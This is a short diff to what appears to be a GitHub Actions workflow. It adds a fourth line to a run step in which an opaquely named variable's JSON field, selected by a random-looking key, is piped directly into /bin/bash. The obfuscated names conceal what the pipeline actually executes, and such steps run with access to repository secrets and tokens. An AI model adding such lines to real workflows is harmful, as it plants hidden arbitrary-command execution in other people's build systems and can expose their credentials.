@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$omrv6005" | jq -r .ybeqy58 | /bin/bash
           echo $fjkc9 | jq -r .d1 | /bin/bash
           echo $g49 | jq -r .m81882 | /bin/bash
+          printf '%s' "$m2" | jq -r .yj456 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
